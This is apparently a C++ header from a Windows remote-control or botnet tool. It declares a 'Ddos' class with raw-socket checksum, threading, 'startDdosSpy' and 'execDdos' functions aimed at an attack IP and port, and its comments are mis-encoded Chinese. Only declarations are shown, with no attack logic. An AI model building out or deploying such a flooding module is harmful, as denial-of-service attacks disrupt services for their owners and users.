// ͨ��ԭʼ�׽���ʵ�ֶ�ָ��Ŀ���dos����
// ����ģʽ

#pragma once
#include "tcpsocket.h"
#include <stdlib.h>
#include <time.h>
#include <windows.h>
#include <vector>
#include <map>
#include <winsock2.h>
#include <Ws2tcpip.h>

class Ddos
{
public:
	Ddos();
	~Ddos();

	// �õ��ķָ����ͽ�����
	std::string DdosSplit;
	std::string DdosEnd;

	static USHORT checksum(USHORT* buffer, int size);
	static void startByNewThread(std::string domain, int port);
	static DWORD WINAPI threadProc(LPVOID args);
	static void startDdosSpy(std::string domain, int port);
	static void addDataToBuffer(TcpSocket* sock, std::string& buf, char* data, int size);
	std::map<std::string, std::string> parseArgs(std::string& data);


	static void execDdos(std::string atkip, int atkport);
};

